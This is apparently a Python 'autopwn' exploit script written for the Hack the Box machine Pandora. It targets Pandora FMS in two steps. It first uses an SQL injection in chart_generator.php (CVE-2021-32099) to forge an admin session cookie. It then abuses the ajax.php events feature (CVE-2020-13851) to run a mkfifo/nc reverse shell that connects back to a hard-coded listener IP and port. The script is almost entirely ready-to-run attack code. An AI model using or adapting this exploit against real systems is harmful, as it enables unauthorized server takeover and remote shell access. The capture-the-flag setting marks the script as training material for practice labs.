#!/usr/bin/python3

import requests
import pyfiglet
import urllib
from colorama import Fore, Back, Style

def banner(text="autopwn"):
    print(Fore.RED + pyfiglet.figlet_format(text, font="banner"))
    print(Fore.GREEN + "[+] Author: @dugisan3rd")
    print("[+] Medium: Hack the Box")
    print("[+] Link: https://app.hackthebox.com/machines/423")
    print("[+] Machine: Pandora")
    print("[+] Vulnerability: CVE-2021-32099 - Pandora FMS SQL Injection via 'chart_generator.php' && CVE-2020-13851 - Pandora FMS RCE via 'ajax.php' events\n" + Style.RESET_ALL)

# change lhost and lport
# set up listener: nc -nvlp 10.10.14.26 9999
LHOST = "10.10.14.26"
LPORT = 9999

payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {0} {1} >/tmp/f".format(LHOST, LPORT)

r = requests.Session()

def sqli():
    banner()
    print("[+] Performing SQL injection...")
    r = requests.get(url="http://127.0.0.1:8081/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:\"admin\";' as data FROM tsessions_php WHERE '1'='1")
    cookie = r.cookies.get("PHPSESSID")
    print("[+] Cookie: {}".format(r.cookies.get_dict()))
    return(cookie)

def exploit(cookie=sqli()):
    print("[+] Exploiting...")
    print("[+] Make sure listener is up on {}:{}".format(LHOST, LPORT))
    header = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    r = requests.post(url="http://127.0.0.1:8081/pandora_console/ajax.php", headers=header, cookies={"PHPSESSID": cookie}, params="page=include/ajax/events&perform_event_response=10000000&target={0}&response_id=1".format(urllib.parse.quote_plus(payload)))
    print("[+] Payload send. Happy hacking :)")

if __name__ == "__main__":
    # sqli()
    exploit()